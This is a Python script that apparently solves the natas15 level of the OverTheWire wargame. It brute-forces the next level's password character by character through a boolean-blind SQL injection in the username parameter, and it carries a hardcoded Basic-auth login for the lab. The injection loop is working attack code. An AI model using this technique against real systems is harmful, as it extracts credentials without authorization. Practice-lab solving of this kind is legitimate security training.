import requests,string,re
from bs4 import BeautifulSoup
password = ("")
alphanum = string.ascii_letters + string.digits
url = "http://natas15.natas.labs.overthewire.org/"
#
headers = {
    'authorization': "Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg==",
    'cache-control': "no-cache",
    'postman-token': "a485c7b5-2c71-52cf-fa16-62c92545ecf4"
    }
while len(password) != 32:
  for attempt in alphanum: 
      querystring = {"debug":"yes","username":"natas16\" and COLLATE latin1_general_cs password like \"" + password + attempt + "%"}
      response = requests.request("GET", url, headers=headers, params=querystring)
      c = response.text
      soup = BeautifulSoup(c, "html.parser")
      samples = soup.find_all(id='content')
      print(samples)
      strsample = str(samples)
      if re.search("This user exists.",strsample):
        password = password + attempt
        #print("Good Value=" + password, len(password))
        break
print(password)
        